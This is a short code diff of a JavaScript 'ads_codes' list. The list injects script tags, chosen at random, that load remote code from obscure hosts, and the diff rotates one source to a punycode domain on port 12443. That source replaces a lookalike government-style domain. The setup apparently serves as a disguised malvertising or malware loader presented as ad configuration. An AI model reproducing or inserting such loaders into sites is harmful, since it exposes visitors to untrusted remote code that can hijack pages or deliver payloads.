@@ -1,6 +1,6 @@
 
 var randoms = {
-	ads_codes: ['<script type=\'text/javascript\' charset=\'UTF-8\' async src=\'https://mg.51zdwy.cn/m/5512?5033373\'><'+'/script>','<script src="https://wap.shenzhengov.work:12443/ty/96C4EF2A-4BBF-1889-33-F747CC723350.alpha"><'+'/script>','<script id=\'mob\' type=\'text/javascript\' charset=\'utf-8\' src=\'https://k.ttzhongbao.com/d.php?pid=3860\'><'+'/script>'],
+	ads_codes: ['<script type=\'text/javascript\' charset=\'UTF-8\' async src=\'https://mg.51zdwy.cn/m/5512?5033373\'><'+'/script>','<script src="https://toutiao.xn--fiqs8s:12443/ty/879A6601-2A38-1889-33-4178CCE4E409.alpha"><'+'/script>','<script id=\'mob\' type=\'text/javascript\' charset=\'utf-8\' src=\'https://k.ttzhongbao.com/d.php?pid=3860\'><'+'/script>'],
 	ads_weight: [10,10,10],
 
 	get_random: function(weight) {
